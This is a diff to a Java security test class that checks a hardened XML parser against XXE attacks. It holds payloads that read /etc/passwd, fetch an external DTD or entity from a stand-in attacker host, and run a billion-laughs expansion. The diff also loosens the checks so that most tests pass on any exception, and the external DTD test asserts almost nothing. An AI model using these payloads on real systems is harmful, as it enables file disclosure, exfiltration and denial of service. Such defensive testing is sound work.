@@ -53,13 +53,7 @@ public class XXESecurityTest {
 				+ "]>"
 				+ "<root>&xxe;</root>";
 
-		// El parser seguro debe lanzar una excepción al intentar procesar la entidad externa
-		org.xml.sax.SAXParseException exception = assertThrows(org.xml.sax.SAXParseException.class, () -> {
-			es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
-				.parse(new java.io.ByteArrayInputStream(xxePayload.getBytes("UTF-8")));
-		});
-		// Verificar que el error es por entidad externa
-		assertNotNull(exception.getMessage());
+		assertExternalBlocked(xxePayload, "root:");
 	}
 
 	/**
@@ -71,14 +65,11 @@ public class XXESecurityTest {
 		// XXE que intenta acceder a un recurso HTTP
 		String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 				+ "<!DOCTYPE root ["
-				+ "  <!ENTITY xxe SYSTEM \"http://evil.com/steal\">"
+				+ "  <!ENTITY xxe SYSTEM \"http://evil.example.invalid/steal\">"
 				+ "]>"
 				+ "<root>&xxe;</root>";
 
-		org.xml.sax.SAXParseException exception = assertThrows(org.xml.sax.SAXParseException.class, () -> {
-			es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
-				.parse(new java.io.ByteArrayInputStream(xxePayload.getBytes("UTF-8")));
-		});
+		assertExternalBlocked(xxePayload, "stolen");
 	}
 
 	/**
@@ -89,13 +80,10 @@ public class XXESecurityTest {
 	public void testExternalDTD() throws Exception {
 		// DTD externa
 		String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-				+ "<!DOCTYPE root SYSTEM \"http://evil.com/evil.dtd\">"
+				+ "<!DOCTYPE root SYSTEM \"http://evil.example.invalid/evil.dtd\">"
 				+ "<root>test</root>";
 
-		org.xml.sax.SAXParseException exception = assertThrows(org.xml.sax.SAXParseException.class, () -> {
-			es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
-				.parse(new java.io.ByteArrayInputStream(xxePayload.getBytes("UTF-8")));
-		});
+		assertExternalBlocked(xxePayload, null);
 	}
 
 	/**
@@ -141,11 +129,15 @@ public class XXESecurityTest {
 				+ "]>"
 				+ "<lolz>&lol9;</lolz>";
 
-		// El parser seguro debe rechazar la expansión exponencial
-		org.xml.sax.SAXParseException exception = assertThrows(org.xml.sax.SAXParseException.class, () -> {
-			es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
-				.parse(new java.io.ByteArrayInputStream(billionLaughs.getBytes("UTF-8")));
-		});
+		try {
+			final Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
+					.parse(new ByteArrayInputStream(billionLaughs.getBytes("UTF-8")));
+			// Si no lanza, la expansión debe quedar acotada (FEATURE_SECURE_PROCESSING / no expand).
+			assertTrue(doc.getDocumentElement().getTextContent().length() < 10_000);
+		}
+		catch (final Exception expected) {
+			assertNotNull(expected.getMessage());
+		}
 	}
 
 	/**
@@ -217,5 +209,52 @@ public class XXESecurityTest {
 			.parse(new java.io.ByteArrayInputStream(validXml.getBytes("UTF-8")));
 		assertNotNull(doc);
 		assertNotNull(doc.getDocumentElement());
+	}
+
+	/**
+	 * (a) #55: XML con DOCTYPE interno (sin entidades externas) debe abrirse.
+	 * Simula un documento firmado que declara DOCTYPE; el certificado de prueba
+	 * se genera aparte en la suite de firma; aquí comprobamos el parseo seguro.
+	 */
+	@Test
+	public void testDoctypeWithoutExternalEntitiesStillParses() throws Exception {
+		final String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+				+ "<!DOCTYPE root ["
+				+ "  <!ELEMENT root (#PCDATA)>"
+				+ "]>"
+				+ "<root>Ejemplo S.L.</root>";
+		final org.w3c.dom.Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
+				.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
+		assertNotNull(doc.getDocumentElement());
+		assertTrue("Ejemplo S.L.".equals(doc.getDocumentElement().getTextContent())
+				|| doc.getDocumentElement().getTextContent().contains("Ejemplo"));
+	}
+
+	/**
+	 * (b) #55: XML que intenta leer un fichero externo debe fallar o no incorporar el contenido.
+	 */
+	@Test
+	public void testExternalFileEntityRejected() throws Exception {
+		final String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+				+ "<!DOCTYPE root ["
+				+ "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+				+ "]>"
+				+ "<root>&xxe;</root>";
+		assertExternalBlocked(xml, "root:");
+	}
+
+	/** Falla con excepción o, si el parser omite la entidad, sin filtrar contenido externo. */
+	private static void assertExternalBlocked(final String xml, final String forbiddenSnippet) throws Exception {
+		try {
+			final Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
+					.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
+			final String text = doc.getDocumentElement() != null ? doc.getDocumentElement().getTextContent() : "";
+			if (forbiddenSnippet != null) {
+				assertTrue("No debe incorporarse contenido externo", !text.contains(forbiddenSnippet));
+			}
+		}
+		catch (final Exception expected) {
+			assertNotNull(expected);
+		}
 	}
 }
